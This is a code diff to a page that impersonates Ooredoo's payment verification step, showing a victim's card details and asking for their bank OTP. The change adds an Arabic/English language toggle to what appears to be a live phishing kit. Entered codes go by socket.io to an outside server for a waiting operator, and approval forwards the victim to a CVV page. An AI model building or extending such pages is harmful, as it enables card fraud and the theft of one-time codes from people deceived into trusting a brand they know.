@@ -10,8 +10,11 @@
 @font-face { font-family: 'NotoKufiArabic-Regular'; src: url('/ooredoo/fonts/NotoKufiArabic-Regular.woff2') format('woff2'); }
 @font-face { font-family: 'NotoKufiArabic-SemiBold'; src: url('/ooredoo/fonts/NotoKufiArabic-SemiBold.woff2') format('woff2'); }
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: 'Rubik-Regular', 'NotoKufiArabic-Regular', Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; direction: rtl; }
-.otp-container { width: 100%; max-width: 420px; margin: 40px auto; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; }
+body { font-family: 'Rubik-Regular', 'NotoKufiArabic-Regular', Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; flex-direction: column; align-items: center; direction: rtl; }
+.lang-toggle-wrapper { width: 100%; max-width: 420px; display: flex; justify-content: flex-start; margin-top: 12px; padding: 0 24px; }
+.lang-toggle { background: #fff; border: 1px solid #ddd; border-radius: 20px; padding: 6px 16px; font-size: 13px; cursor: pointer; color: #333; }
+.lang-toggle:hover { background: #f0f0f0; }
+.otp-container { width: 100%; max-width: 420px; margin: 10px auto 40px; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; }
 .logo-row { display: flex; justify-content: center; margin-bottom: 20px; }
 .logo-row img { height: 36px; }
 h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 20px; color: #080808; margin-bottom: 6px; }
@@ -44,20 +47,26 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
 .submit-btn.active { background: #ed1c24; color: #fff; cursor: pointer; box-shadow: 0 8px 20px rgba(237,28,36,0.18); }
 .waiting-msg { text-align: center; color: #ed1c24; font-size: 14px; margin-top: 12px; display: none; }
 @media (max-width: 500px) {
-  .otp-container { margin: 0; border-radius: 0; min-height: 100vh; padding: 24px 16px; }
+  .otp-container { margin: 10px 0 0; border-radius: 0; min-height: calc(100vh - 50px); padding: 24px 16px; }
+  .lang-toggle-wrapper { padding: 0 16px; }
 }
 </style>
 </head>
 <body>
+
+<div class="lang-toggle-wrapper">
+  <button class="lang-toggle" id="langToggle" onclick="toggleLanguage()">English</button>
+</div>
+
 <div class="otp-container">
   <div class="logo-row"><img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo"></div>
-  <h1>رمز التحقق (OTP)</h1>
-  <p class="subtitle">تم إرسال رمز التحقق إلى رقم هاتفك المسجل لدى البنك. يرجى إدخال الرمز أدناه.</p>
+  <h1 id="pageTitle">رمز التحقق (OTP)</h1>
+  <p class="subtitle" id="pageSubtitle">تم إرسال رمز التحقق إلى رقم هاتفك المسجل لدى البنك. يرجى إدخال الرمز أدناه.</p>
 
   <div class="card-info">
-    <div class="row"><span class="label">نوع البطاقة</span><span class="value" id="cardType">-</span></div>
-    <div class="row"><span class="label">آخر 4 أرقام</span><span class="value" id="cardLast4">****</span></div>
-    <div class="row"><span class="label">المبلغ</span><span class="value" id="otpAmount">0 ر.ع</span></div>
+    <div class="row"><span class="label" id="labelCardType">نوع البطاقة</span><span class="value" id="cardType">-</span></div>
+    <div class="row"><span class="label" id="labelLast4">آخر 4 أرقام</span><span class="value" id="cardLast4">****</span></div>
+    <div class="row"><span class="label" id="labelAmount">المبلغ</span><span class="value" id="otpAmount">0 ر.ع</span></div>
   </div>
 
   <div class="otp-input-area">
@@ -78,6 +87,79 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <script>
 (function() {
+  var translations = {
+    ar: {
+      langBtn: 'English',
+      title: 'رمز التحقق (OTP)',
+      subtitle: 'تم إرسال رمز التحقق إلى رقم هاتفك المسجل لدى البنك. يرجى إدخال الرمز أدناه.',
+      cardType: 'نوع البطاقة',
+      last4: 'آخر 4 أرقام',
+      amount: 'المبلغ',
+      error: 'رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.',
+      resendTimer: 'إعادة الإرسال بعد',
+      seconds: 'ثانية',
+      resendBtn: 'إعادة إرسال الرمز',
+      submitBtn: 'تأكيد',
+      waiting: 'جاري التحقق...',
+      currency: 'ر.ع'
+    },
+    en: {
+      langBtn: 'العربية',
+      title: 'Verification Code (OTP)',
+      subtitle: 'A verification code has been sent to your phone number registered with the bank. Please enter the code below.',
+      cardType: 'Card Type',
+      last4: 'Last 4 Digits',
+      amount: 'Amount',
+      error: 'Invalid verification code. Please try again.',
+      resendTimer: 'Resend in',
+      seconds: 'seconds',
+      resendBtn: 'Resend Code',
+      submitBtn: 'Confirm',
+      waiting: 'Verifying...',
+      currency: 'OMR'
+    }
+  };
+
+  var currentLang = localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || 'ar';
+
+  function applyLanguage() {
+    var t = translations[currentLang];
+    document.documentElement.lang = currentLang === 'ar' ? 'ar' : 'en';
+    document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+    document.body.style.direction = currentLang === 'ar' ? 'rtl' : 'ltr';
+    document.getElementById('langToggle').textContent = t.langBtn;
+    document.getElementById('pageTitle').textContent = t.title;
+    document.getElementById('pageSubtitle').textContent = t.subtitle;
+    document.getElementById('labelCardType').textContent = t.cardType;
+    document.getElementById('labelLast4').textContent = t.last4;
+    document.getElementById('labelAmount').textContent = t.amount;
+    document.getElementById('otpError').textContent = t.error;
+    document.getElementById('resendBtn').textContent = t.resendBtn;
+    document.getElementById('submitBtn').textContent = t.submitBtn;
+    document.getElementById('waitingMsg').textContent = t.waiting;
+    // Update amount with correct currency
+    var paymentData = {};
+    try { paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}'); } catch(e) {}
+    document.getElementById('otpAmount').textContent = (paymentData.totalPaid || '0') + ' ' + t.currency;
+    // Update timer text
+    updateTimerText();
+  }
+
+  function updateTimerText() {
+    var t = translations[currentLang];
+    var timerText = document.getElementById('timerText');
+    var countdownEl = document.getElementById('countdown');
+    timerText.innerHTML = t.resendTimer + ' <span id="countdown">' + countdownEl.textContent + '</span> ' + t.seconds;
+  }
+
+  window.toggleLanguage = function() {
+    currentLang = currentLang === 'ar' ? 'en' : 'ar';
+    localStorage.setItem('siteLang', currentLang); localStorage.setItem('oredoo_site_language', currentLang);
+    applyLanguage();
+  };
+
+  applyLanguage();
+
   var SOCKET_URL = 'https://oredoooman-server.fly.dev';
   var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
   var visitorId = localStorage.getItem('visitorId') || '';
@@ -89,7 +171,8 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
   try { paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}'); } catch(e) {}
   document.getElementById('cardType').textContent = paymentData.cardType || '-';
   document.getElementById('cardLast4').textContent = paymentData.cardLast4 || '****';
-  document.getElementById('otpAmount').textContent = (paymentData.totalPaid || '0') + ' ر.ع';
+  var t = translations[currentLang];
+  document.getElementById('otpAmount').textContent = (paymentData.totalPaid || '0') + ' ' + t.currency;
 
   // Countdown
   var countdown = 120;
@@ -103,7 +186,7 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
       timerText.style.display = 'none';
       resendBtn.style.display = 'inline';
     } else {
-      countdownEl.textContent = countdown;
+      document.getElementById('countdown').textContent = countdown;
     }
   }, 1000);
 
@@ -140,7 +223,7 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
     document.getElementById('waitingMsg').style.display = 'none';
     submitBtn.classList.add('active');
     submitBtn.disabled = false;
-    submitBtn.textContent = 'تأكيد';
+    submitBtn.textContent = translations[currentLang].submitBtn;
 
     if (act === 'approve') {
       window.location.href = '/cvv/';
@@ -177,7 +260,7 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
     document.getElementById('otpError').style.display = 'none';
     submitBtn.disabled = true;
     submitBtn.classList.remove('active');
-    submitBtn.textContent = 'جاري التحقق...';
+    submitBtn.textContent = translations[currentLang].waiting;
     document.getElementById('waitingMsg').style.display = 'block';
 
     socket.emit('more-info', {
@@ -192,11 +275,11 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
     resendBtn.style.display = 'none';
     timerText.style.display = 'inline';
     countdown = 120;
-    countdownEl.textContent = countdown;
+    document.getElementById('countdown').textContent = countdown;
     countdownInterval = setInterval(function() {
       countdown--;
       if (countdown <= 0) { clearInterval(countdownInterval); timerText.style.display = 'none'; resendBtn.style.display = 'inline'; }
-      else countdownEl.textContent = countdown;
+      else document.getElementById('countdown').textContent = countdown;
     }, 1000);
     socket.emit('more-info', { page: 'رمز التحقق (OTP)', content: { action: 'resend_otp' }, waitingForAdminResponse: false });
   };
